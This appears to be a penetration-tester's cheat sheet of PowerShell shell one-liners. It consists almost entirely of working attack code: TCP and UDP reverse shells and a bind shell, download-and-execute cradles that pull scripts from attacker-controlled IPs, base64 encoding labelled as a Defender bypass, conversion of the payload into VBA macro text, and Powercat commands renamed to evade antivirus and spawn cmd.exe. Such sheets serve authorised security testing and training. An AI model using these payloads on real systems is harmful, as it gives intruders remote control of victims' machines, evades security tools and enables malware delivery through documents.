# PowerShell Shells

### **Powershell - Reverse**

```powershell
powershell -nop -WindowStyle hidden -c "$c = New-Object System.Net.Sockets.TCPClient('192.168.50.47',443);$r = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $r.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$s = (iex $d 2>&1 | Out-String );$s2 = $s + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($s2);$r.Write($sendbyte,0,$sendbyte.Length);$r.Flush()};$c.Close()"
```

```powershell
$c = New-Object System.Net.Sockets.TCPClient('192.168.49.124',443);$r = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $r.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$s = (iex $d 2>&1 | Out-String );$s2 = $s + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($s2);$r.Write($sendbyte,0,$sendbyte.Length);$r.Flush()};$c.Close()
```

### **Powershell - Bind**

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### **Powershell Web - Reverse**

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.49/powershell-reverse-shell.ps1')"
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.7.240/powershell-reverse-shell.ps1')"
```

### **Powershell Reverse Shell (Invoke-PowerShellTcp.ps1)**

* https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
* Rename shell.ps1 - Modify IP/PORT for our purpose

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

### **Powershell Reverse UDP**

```powershell
$Address='192.168.49.124';$Port='53';$UdpClient=New-Object System.Net.Sockets.UdpClient;$UdpClient.Connect($Address,$Port);$Bytes=[System.Text.Encoding]::ASCII.GetBytes('PS '+(pwd).Path+'> ');$UdpClient.Send($Bytes,$Bytes.Length);while($true){$EndPoint=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$Received=$UdpClient.Receive([ref]$EndPoint);if($Received -ne $null -and $Received.Length -gt 0){$Command=[System.Text.Encoding]::ASCII.GetString($Received);if($Command){$Result=iex $Command 2>&1|Out-String;$Bytes=[System.Text.Encoding]::ASCII.GetBytes($Result+'PS '+(pwd).Path+'> ');$UdpClient.Send($Bytes,$Bytes.Length)}}}
```

```powershell
$a='192.168.49.124';$p='53';$u=New-Object System.Net.Sockets.UdpClient;$u.Connect($a,$p);$b=[System.Text.Encoding]::ASCII.GetBytes('PS '+(pwd).Path+'> ');$u.Send($b,$b.Length);while($true){$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$x=$u.Receive([ref]$ep);if($x -ne $null -and $x.Length -gt 0){$c=[System.Text.Encoding]::ASCII.GetString($x);if($c){$r=iex $c 2>&1|Out-String;$b=[System.Text.Encoding]::ASCII.GetBytes($r+'PS '+(pwd).Path+'> ');$u.Send($b,$b.Length)}}}
```

#### Powershell Encoded

```powershell
$text = "$c = New-Object System.Net.Sockets.TCPClient('192.168.50.47',8443);$r = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $r.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$s = (iex $d 2>&1 | Out-String );$s2 = $s + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($s2);$r.Write($sendbyte,0,$sendbyte.Length);$r.Flush()};$c.Close()"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

* Save as a file

#### Bypass Defender

```powershell
$text = "$c = New-Object System.Net.Sockets.TCPClient('192.168.50.47',8443);$r = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $r.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$s = (iex $d 2>&1 | Out-String );$s2 = $s + 'Dealybob ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($s2);$r.Write($sendbyte,0,$sendbyte.Length);$r.Flush()};$c.Close()"

$file = Get-Content -Path test.txt -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($file)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText | clip
```

#### Convert to VBA Macro Format

```powershell
$lines = [System.Text.RegularExpressions.Regex]::Matches($EncodedText, ".{1,800}")
$x = "powershell -exec bypass -nop -WindowStyle hidden -enc "
foreach ($line in $lines) {
	$x += 'x = x + "' + $line.Value + '"' + "`n"
}
$x += '"'
Write-Output $x | clip
```

### **Powercat**

* https://github.com/besimorhino/powercat/blob/master/powercat.ps1

```
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
```

#### Reverse Shell

**Usage**

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.49/powercat.ps1'); powercat -c 10.10.14.49 -p 443 -e cmd.exe"
```

**Modified to Evade Defender**

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.139/something.ps1'); something -c 192.168.23.139 -p 443 -e cmd.exe"
```

#### Listener

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.190/powercat.ps1'); powercat -l -p 1234 -e cmd.exe"
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.157/something.ps1'); something -l -p 8080 -e cmd.exe"
```

#### Parameters

```
-l      Listen for a connection.                             [Switch]
-c      Connect to a listener.                               [String]
-p      The port to connect to, or listen on.                [String]
-e      Execute. (GAPING_SECURITY_HOLE)                      [String]
-ep     Execute Powershell.                                  [Switch]
-r      Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
-u      Transfer data over UDP.                              [Switch]
-dns    Transfer data over dns (dnscat2).                    [String]
-dnsft  DNS Failure Threshold.                               [int32]
-t      Timeout option. Default: 60                          [int32]
-i      Input: Filepath (string), byte array, or string.     [object]
-o      Console Output Type: "Host", "Bytes", or "String"    [String]
-of     Output File Path.                                    [String]
-d      Disconnect after connecting.                         [Switch]
-rep    Repeater. Restart after disconnecting.               [Switch]
-g      Generate Payload.                                    [Switch]
-ge     Generate Encoded Payload.                            [Switch]
-h      Print the help message.                              [Switch]
```

```powershell
"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.172/powercat.ps1'); powercat -c 192.168.119.172 -p 443 -e cmd.exe"
```
